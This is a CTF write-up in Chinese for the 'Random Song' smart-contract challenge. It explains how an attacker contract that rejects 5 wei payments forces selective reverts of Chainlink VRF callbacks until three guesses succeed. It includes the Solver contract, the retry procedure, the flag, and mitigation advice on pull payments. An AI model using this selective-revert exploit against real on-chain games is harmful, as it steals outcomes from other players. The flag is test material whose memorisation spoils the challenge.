# Random Song

## 题目简述

智能合约让玩家猜 Chainlink VRF 返回值对 3 取模后的歌曲编号。初始能量只够玩三次，而 `isSolved()` 要求三次全部猜中；直接预测可验证随机数不可行。

漏洞出在回调给玩家发奖励的方式。猜错发送 5 wei，猜对发送 10 wei。让攻击合约拒收 5 wei、只接收 10 wei，就能让错误回调整笔回滚，而正确结果正常提交。

## 解题过程

游戏开始时记录调用者和猜测，再异步请求 VRF：

```solidity
function play(uint256 touchseq) public {
    require(bonusEnergy >= 10);
    player = msg.sender;
    touchSeq = touchseq;
    COORDINATOR.requestRandomWords(...);
}
```

回调逻辑为：

```solidity
bonusEnergy -= 10;

if (touchSeq != songSeq) {
    payable(player).transfer(5 wei);
    return;
}

payable(player).transfer(10 wei);
allPerfect += 1;
```

Solidity 的 `transfer` 在收款方回退函数 revert 时，会让当前调用一起 revert。构造中间合约：

```solidity
interface RhythmGame {
    function play(uint256 guess) external;
}

contract Solver {
    RhythmGame public game;

    constructor(address instance) {
        game = RhythmGame(instance);
    }

    function play(uint256 guess) external {
        game.play(guess);
    }

    receive() external payable {
        require(msg.value == 10 wei);
    }
}
```

两种情况分别是：

- 猜对：游戏发送 10 wei，`receive` 通过，能量减少 10，`allPerfect` 加 1；
- 猜错：游戏发送 5 wei，`receive` revert，整个 `fulfillRandomWords` 回滚，能量扣除也被撤销。

VRF 请求本身已被消费，但游戏状态仍允许重新调用 `play`。每次提交一个 0 至 2 的猜测并等待对应回调完成；错了继续请求，猜中后再开始下一轮。不要同时积压多个请求，因为合约把 `player` 和 `touchSeq` 存在全局变量中，后发请求会覆盖前一请求的状态。

成功三次后：

```solidity
function isSolved() public view returns (bool) {
    require(allPerfect == 3);
    return true;
}
```

服务返回：

```text
SEKAI{R4nd0mn3ss_1n_8lockcha1n_i5_n0t_3asy_7o_4chi3v3}
```

## 方法总结

本题不是攻击 Chainlink VRF，而是攻击消费随机数的业务回调。向不可信合约强制转账会把收款方的异常传播回业务逻辑，形成选择性回滚：攻击者只让有利结果提交。随机游戏应先固定不可回滚的结算状态，再采用 pull payment 让用户自行领取奖励，避免外部调用决定本轮结果能否落链。
